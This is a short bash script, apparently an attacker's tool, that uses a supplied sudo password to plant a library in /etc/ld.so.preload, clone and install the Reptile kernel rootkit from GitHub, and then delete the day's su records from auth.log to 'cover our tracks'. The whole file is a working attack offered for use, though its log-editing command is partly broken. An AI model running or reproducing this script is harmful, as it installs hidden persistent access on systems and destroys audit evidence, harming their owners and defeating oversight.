#!/bin/bash
# NOTE: first argument is password of sudoer
echo $1 | sudo -S sh -c 'echo /lib/libselinux.so >> /etc/ld.so.preload;\
apt install build-essential libncurses-dev linux-headers-$(uname -r);\
git clone https://github.com/f0rb1dd3n/Reptile.git;\
cd Reptile;\
make menuconfig;\
make;\
make install;'

# cover our tracks (both for su and sudo)
echo $1 | sudo -S 'cat auth.log | grep -v "`date | awk '{print $3, $2}'`.*su" > auth2.log && mv auth2.log auth.log'

exit
